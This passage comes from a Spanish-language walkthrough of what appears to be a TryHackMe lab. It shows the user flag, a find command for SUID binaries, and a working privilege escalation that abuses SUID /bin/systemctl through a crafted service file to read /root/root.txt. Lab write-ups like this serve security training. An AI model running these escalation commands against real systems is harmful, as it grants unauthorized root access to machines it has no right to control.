class="hljs-built_in">cd</span> bill<br>$ ls<br>user.txt<br>$ cat user.txt<br></code></pre></td></tr></table></figure><p>Output:</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">8bd799<span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">***</span> USER FLAG<br></code></pre></td></tr></table></figure><h3 id="3-Solucion-1"><a href="#3-Solucion-1" class="headerlink" title="3. Solución"></a>3. Solución</h3><p><img src="/img/Walkthrough/THM/Vulnversity/task_4_1.png" alt="Figura 8: Solución Task 4"><br><img src="/img/Walkthrough/THM/Vulnversity/task_4_2.png" alt="Figura 9: Solución Task 4"></p><h2 id="Task-5-Escalada-de-privilegios"><a href="#Task-5-Escalada-de-privilegios" class="headerlink" title="Task 5 - Escalada de privilegios"></a>Task 5 - Escalada de privilegios</h2><p>En esta máquina deberemos explotar una vulnerabilidad típica llamada <strong>SUID Vulnerability</strong>. Se trata de aprovecharse de esos ejecutables o ficheros que tienen el bit de SUID habilitado para poder ejecutar servicios con los privilegios de otro usuario.</p><h4 id="1-Encontrar-programas-con-bit-SUID-habilitado"><a href="#1-Encontrar-programas-con-bit-SUID-habilitado" class="headerlink" title="1. Encontrar programas con bit SUID habilitado"></a>1. Encontrar programas con bit SUID habilitado</h4><p>Para comprobar que ejecutables tienen el bit de SUID habilitado, ejecutaremos el siguiente comando:</p><p>Input:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -user root -perm 4000 2&gt;/dev/null<br></code></pre></td></tr></table></figure><p>Output:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">/usr/bin/newuidmap<br>/usr/bin/chfn<br>/usr/bin/newgidmap<br>/usr/bin/sudo<br>/usr/bin/chsh<br>/usr/bin/passwd<br>/usr/bin/pkexec<br>/usr/bin/newgrp<br>/usr/bin/gpasswd<br>/usr/lib/snapd/snap-confine<br>/usr/lib/policykit-1/polkit-agent-helper-1<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/squid/pinger<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic<br>/bin/su<br>/bin/ntfs-3g<br>/bin/mount<br>/bin/ping6<br>/bin/umount<br>/bin/systemctl<br>/bin/ping<br>/bin/fusermount<br>/sbin/mount.cifs<br></code></pre></td></tr></table></figure><p>Si buscamos por internet técnicas de escalado de privilegios sobre los diferentes binarios que nos aparecen en la lista, veremos que el <strong>/bin/systemctl</strong> es un binario muy utilizado para este tipo de tareas. Una web muy recomendada para consultar diferentes técnicas de escalado de privilegios es <a href="https://gtfobins.github.io/">https://gtfobins.github.io</a>.<br><img src="/img/Walkthrough/THM/Vulnversity/gtfobins.png" alt="Figura 10: Consulta de ../systemctl en gftobins"></p><h4 id="2-Escalar-privilegios"><a href="#2-Escalar-privilegios" class="headerlink" title="2. Escalar privilegios"></a>2. Escalar privilegios</h4><p>Para aprovecharnos de la escalada de privilegios mediante el <strong>SUID</strong> del <strong>/bin/systemctl</strong> deberemos ejecutar los siguientes comandos en la consola. la variable <strong>ExecStart</strong> es la que deberemos modificar para que en vez de obtener el id del usuario que ejecuta el programa, que nos lea el contenido del fichero <strong>/root/root.txt</strong> para obtener la flag.</p><p>Input:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">TF=$<span class="hljs-params">(mktemp)</span><span class="hljs-string">.service</span><br><span class="hljs-keyword">echo</span> &#x27;[Service]<br>Type=oneshot<br>ExecStart=<span class="hljs-string">/bin/sh</span> -c <span class="hljs-string">&quot;cat /root/root.txt &gt; /tmp/output&quot;</span><br>[Install]<br>WantedBy=multi-user.target&#x27; &gt; $TF<br><span class="hljs-string">/bin/systemctl</span> link $TF<br><span class="hljs-string">/bin/systemctl</span> enable <span class="hljs-params">--now</span> $TF<br>cat <span class="hljs-string">/tmp/output</span><br></code></pre></td></tr></table></figure><p>Output:</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">a58ff8<span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">*****</span><span class="hljs-strong">***</span> ROOT FLAG<br></code></pre></td></tr></table></figure><h4 id="3-Solucion-2"><a href="#3-Solucion-2" class="headerlink" title="3. Solución"></a>3. Solución</h4><p><img src="/img/Walkthrough/THM/Vulnversity/task_5.png" alt="Figura X: Solución Task 5"></p>]]></content>
    
    
    <categories>
      
      <category>Walkthroughs</category>
      
      <category>THM</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Laboratorio</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
